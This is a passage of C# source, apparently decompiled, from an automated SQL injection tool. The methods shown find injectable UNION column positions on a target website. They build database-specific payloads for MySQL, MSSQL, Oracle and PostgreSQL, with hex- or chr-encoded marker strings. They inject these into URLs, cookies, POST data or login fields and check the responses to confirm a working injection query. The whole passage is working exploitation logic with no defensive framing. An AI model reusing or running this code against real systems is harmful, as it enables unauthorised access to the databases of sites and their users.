            string sText = "913514562";
            int unionPostion = t.UnionPostion;
            for (int i = 1; i <= unionPostion; i++)
            {
                if (!string.IsNullOrEmpty(str2))
                {
                    str2 = str2 + ",";
                }
                if (Utls.TypeIsMySQL(this.SQLType))
                {
                    str2 = str2 + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(i) + ".9");
                }
                else if (Utls.TypeIsMSSQL(this.SQLType))
                {
                    str2 = str2 + "cast(" + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(i) + ".9") + "+as+char)";
                }
                else if (Utls.TypeIsOracle(this.SQLType))
                {
                    str2 = str2 + Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "||", "chr");
                }
                else if (Utls.TypeIsPostgreSQL(this.SQLType))
                {
                    str2 = Globals.G_Utilities.ConvertTextToSQLChar(sText + Conversions.ToString(i) + ".9", false, "||", "chr");
                }
                else
                {
                    if (this.__CheckErrorPoints)
                    {
                        return;
                    }
                    if (this.URL.ToLower().Contains(".php".ToLower()))
                    {
                        str2 = str2 + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(i) + ".9");
                    }
                    else
                    {
                        str2 = str2 + "cast(" + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(i) + ".9") + "+as+char)";
                    }
                }
            }
            string str4 = t.Traject.Replace("[t]", t.UnionString.Replace("[t]", str2));
            HTMLParams p = new HTMLParams {
                URL = this.URL,
                Cookies = this.Cookies,
                POST = this.POST,
                LoginUser = this.LoginUser,
                LoginPassword = this.LoginPassword
            };
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    p.URL = str4;
                    break;

                case InjectionPoint.Cookies:
                    p.Cookies = str4;
                    break;

                case InjectionPoint.POST:
                    p.POST = str4;
                    break;

                case InjectionPoint.LoginUser:
                    p.LoginUser = str4;
                    break;

                case InjectionPoint.LoginPassword:
                    p.LoginPassword = str4;
                    break;
            }
            string str3 = this.LoadHTML(p);
            if (!this.UnionFound() && str3.ToLower().Contains(sText.ToLower()))
            {
                int num = 0;
                try
                {
                    str3 = str3.Substring(str3.ToLower().IndexOf(sText.ToLower()));
                    string expression = str3.Substring(sText.Length, str3.IndexOf(".") - sText.Length);
                    Analizer analizer = this;
                    lock (analizer)
                    {
                        if (Versioned.IsNumeric(expression))
                        {
                            num = Conversions.ToInteger(expression);
                        }
                    }
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                str2 = "";
                int num5 = t.UnionPostion;
                for (int j = 1; j <= num5; j++)
                {
                    if (!string.IsNullOrEmpty(str2))
                    {
                        str2 = str2 + ",";
                    }
                    if ((j == num) & (num > 0))
                    {
                        str2 = str2 + "[t]";
                    }
                    else
                    {
                        str2 = str2 + Conversions.ToString(j);
                    }
                }
                string sTraject = t.Traject.Replace("[t]", t.UnionString.Replace("[t]", str2));
                if ((num > 0) && this.TestUnion(sTraject))
                {
                    this.UnionString = num;
                    this.UnionCount = t.UnionPostion;
                    this.InjectQuery = sTraject;
                }
            }
        }
        catch (Exception exception3)
        {
            ProjectData.SetProjectError(exception3);
            ProjectData.ClearProjectError();
        }
        finally
        {
            try
            {
                this.__ThreadPoolAnalizer.Close(t.Thread);
            }
            catch (Exception exception4)
            {
                ProjectData.SetProjectError(exception4);
                ProjectData.ClearProjectError();
            }
        }
    }
    private void TryUnionPositionKeyword(ThreadControl t)
    {
        /*try
        {*/
            string unionString;
            int num3;
            string str6;
            string str2 = "";
            string sText = "ABC145ZQ62DWQAFPOIYCFD";
            if (Utls.TypeIsOracle(this.SQLType) && !t.UnionString.ToLower().Contains("dual".ToLower()))
            {
                unionString = t.UnionString.Replace("[t]", "[t] from dual");
            }
            else
            {
                unionString = t.UnionString;
            }
            int unionPostion = t.UnionPostion;
            for (int i = 1; i <= unionPostion; i++)
            {
                if (!string.IsNullOrEmpty(str2))
                {
                    str2 = str2 + ",";
                }
                str2 = str2 + "null";
            }
            string str4 = t.Traject.Replace("[t]", unionString.Replace("[t]", str2));
            HTMLParams p = new HTMLParams {
                URL = this.URL,
                Cookies = this.Cookies,
                POST = this.POST,
                LoginUser = this.LoginUser,
                LoginPassword = this.LoginPassword
            };
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    p.URL = str4;
                    break;

                case InjectionPoint.Cookies:
                    p.Cookies = str4;
                    break;

                case InjectionPoint.POST:
                    p.POST = str4;
                    break;

                case InjectionPoint.LoginUser:
                    p.LoginUser = str4;
                    break;

                case InjectionPoint.LoginPassword:
                    p.LoginPassword = str4;
                    break;
            }
            string str3 = this.LoadHTML(p);
            if (this.UnionFound() || !str3.ToLower().Contains(t.Keyword.ToLower()))
            {
                return;
            }
            if (!((this.SQLType == Types.Unknown) | (this.SQLType == Types.None)))
            {
                num3 = 1;
                int num8 = t.UnionPostion;
                for (int j = 1; j <= num8; j++)
                {
                    int num = 0;
                    str2 = "";
                    int num9 = t.UnionPostion;
                    for (int k = 1; k <= num9; k++)
                    {
                        if (!string.IsNullOrEmpty(str2))
                        {
                            str2 = str2 + ",";
                        }
                        if (k == num3)
                        {
                            str2 = str2 + "[t]";
                        }
                        else
                        {
                            str2 = str2 + "null";
                        }
                    }
                    p = new HTMLParams {
                        URL = this.URL,
                        Cookies = this.Cookies,
                        POST = this.POST,
                        LoginUser = this.LoginUser,
                        LoginPassword = this.LoginPassword
                    };
                    str4 = t.Traject.Replace("[t]", unionString.Replace("[t]", str2));
                    if (Utls.TypeIsMySQL(this.SQLType))
                    {
                        str4 = str4.Replace("[t]", Globals.G_Utilities.ConvertTextToHex(sText));
                    }
                    else if (Utls.TypeIsMSSQL(this.SQLType))
                    {
                        str4 = str4.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "+", "char"));
                    }
                    else if (Utls.TypeIsOracle(this.SQLType))
                    {
                        str4 = str4.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "||", "chr"));
                    }
                    else if (Utls.TypeIsPostgreSQL(this.SQLType))
                    {
                        str4 = str4.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "||", "chr"));
                    }
                    else
                    {
                        if (this.__CheckErrorPoints)
                        {
                            return;
                        }
                        str4 = str4.Replace("[t]", sText);
                    }
                    switch (this.__InjectionPoint)
                    {
                        case InjectionPoint.URL:
                            p.URL = str4;
                            break;

                        case InjectionPoint.Cookies:
                            p.Cookies = str4;
                            break;

                        case InjectionPoint.POST:
                            p.POST = str4;
                            break;

                        case InjectionPoint.LoginUser:
                            p.LoginUser = str4;
                            break;

                        case InjectionPoint.LoginPassword:
                            p.LoginPassword = str4;
                            break;
                    }
                    if (this.LoadHTML(p).ToLower().Contains(sText.ToLower()))
                    {
                        str2 = "";
                        int num10 = t.UnionPostion;
                        for (int m = 1; m <= num10; m++)
                        {
                            if (!string.IsNullOrEmpty(str2))
                            {
                                str2 = str2 + ",";
                            }
                            if (m == num3)
                            {
                                str2 = str2 + "[t]";
                            }
                            else
                            {
                                str2 = str2 + "null";
                            }
                        }
                        str6 = t.Traject.Replace("[t]", unionString.Replace("[t]", str2));
                        if (this.TestUnion(str6))
                        {
                            goto Label_045C;
                        }
                    }
                    num++;
                    num3++;
                    if (this.PausedOrCanceled() || (num > 3))
                    {
                        return;
                    }
                }
            }
            goto Label_047C;
        Label_045C:
            this.InjectQuery = str6;
            this.UnionCount = t.UnionPostion;
            this.UnionString = num3;
        Label_047C:
            if (this.UnionString == 0)
            {
            }
        /*}
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        finally
        {*/
            try
            {
                this.__ThreadPoolAnalizer.Close(t.Thread);
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
        /*}*/
    }

	
}
